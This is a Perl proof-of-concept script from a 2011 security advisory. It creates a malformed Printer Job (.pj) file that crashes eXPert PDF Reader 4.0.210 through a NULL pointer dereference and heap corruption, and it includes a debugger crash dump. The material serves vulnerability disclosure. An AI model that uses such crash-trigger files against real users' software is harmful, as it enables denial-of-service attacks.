#!/usr/local/bin/perl
#
#
# eXPert PDF Reader 4.0 NULL Pointer Dereference and Heap Corruption Denial Of Service
#
#
# Vendor: Visagesoft
# Product web page: http://www.visagesoft.com
# Affected version: 4.0.210
#
# Summary: eXPert PDF Reader is a free pdf viewer software that lets you view and print
# pdf documents on windows operating systems.
#
# Desc: The vulnerability is caused due to a NULL pointer dereference when processing
# malicious Printer Job (.pj) files and can be exploited to crash the application and
# cause a heap corruption and denial of service scenarios.
#
# Tested on: Microsoft Windows XP Professional SP3 (EN)
#
# ----------------------------------------------------------------------------------
#
# HEAP[vspdfreader.exe]: Invalid allocation size - 82828290 (exceeded 7ffdefff)
# (77c.d48): Unknown exception - code 0eedfade (first chance)
# (77c.d48): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=00000001 ebx=02d7a188 ecx=00bd311c edx=00000002 esi=00000002 edi=0012fe24
# eip=00446cc9 esp=0012fb6c ebp=0012fb84 iopl=0         nv up ei ng nz ac pe cy
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210297
# *** WARNING: Unable to verify checksum for image00400000
# *** ERROR: Module load completed but symbols could not be loaded for image00400000
# image00400000+0x46cc9:
# 00446cc9 8b04b0          mov     eax,dword ptr [eax+esi*4] ds:0023:00000009=????????
#
# image00400000+0x46cc9:
# 00446cc9 8b04b0          mov     eax,dword ptr [eax+esi*4]
# 00446ccc 5e              pop     esi
# 00446ccd 5b              pop     ebx
# 00446cce c3              ret
# 00446ccf 90              nop
# 00446cd0 8bc8            mov     ecx,eax
# 00446cd2 b201            mov     dl,1
# 00446cd4 a1f48d4300      mov     eax,dword ptr [image00400000+0x38df4 (00438df4)]
#
# image00400000+0x38df4:
# 00438df4 4c              dec     esp
# 00438df5 8e4300          mov     es,word ptr [ebx]
# 00438df8 0000            add     byte ptr [eax],al
# 00438dfa 0000            add     byte ptr [eax],al
# 00438dfc 0000            add     byte ptr [eax],al
# 00438dfe 0000            add     byte ptr [eax],al
# 00438e00 0000            add     byte ptr [eax],al
# 00438e02 0000            add     byte ptr [eax],al
#
# ----------------------------------------------------------------------------------
#
# Vulnerability discovered by: Gjoko 'LiquidWorm' Krstic
# liquidworm gmail com
# Zero Science Lab - http://www.zeroscience.mk
#
# Advisory ID: ZSL-2011-5000
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5000.php
#
#
# 25.02.2011
#

my $file = "dniz0r.pj";
my $data = ""; #my $data = "J" x(2+2);
open($FILE,">$file");
print $FILE $data;
close($FILE);
print "\npj File Created successfully\n";